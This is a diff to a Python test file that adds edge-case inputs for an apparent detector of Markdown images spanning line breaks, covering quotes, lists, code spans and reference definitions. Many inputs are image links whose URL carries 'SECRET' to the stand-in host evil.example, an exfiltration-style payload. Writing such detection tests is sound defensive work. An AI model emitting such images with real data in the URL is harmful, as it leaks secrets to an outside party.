@@ -117,6 +117,15 @@ async def test_md_shortcut_reference_image_detected(text: str, patch_central_dat
         "![a\n<div>\nb](https://evil.example/SECRET/p.png)",
         "# ![a\nb](https://evil.example/SECRET/p.png)",
         "1. ![a\n2. b](https://evil.example/SECRET/p.png)",
+        "> ![a\n> > b](https://evil.example/SECRET/p.png)",
+        "- ![a\n    # b](https://evil.example/SECRET/p.png)",
+        # Code is not rendered as an image.
+        "```\n![a\nb](https://evil.example/SECRET/p.png)\n```",
+        "    ![a\n    b](https://evil.example/SECRET/p.png)",
+        "`![a\nb](https://evil.example/SECRET/p.png)`",
+        # A reference across lines needs a matching definition.
+        "![a\nb][missing]\n\n[other]: https://evil.example/SECRET/p.png",
+        "![a\nb][]",
         # A shortcut label that spans lines still needs a matching definition.
         "![quarterly\nreport]",
     ],
@@ -156,6 +165,12 @@ async def test_md_image_lookalikes_not_detected(text: str, patch_central_databas
         # Block quote continuation lines and list item continuation lines stay in the paragraph.
         ("> ![quarterly\n> report](https://evil.example/SECRET/p.png)", "Markdown Image (inline)"),
         ("- ![quarterly\n  report](https://evil.example/SECRET/p.png)", "Markdown Image (inline)"),
+        # A bracket inside a code span is text.
+        ("![a `]` b\nc](https://evil.example/SECRET/p.png)", "Markdown Image (inline)"),
+        (
+            "![quarterly\nreport][]\n\n[quarterly report]: https://evil.example/SECRET/p.png",
+            "Markdown Image (reference)",
+        ),
     ],
 )
 async def test_md_image_with_line_break_detected(text: str, pattern_name: str, patch_central_database):
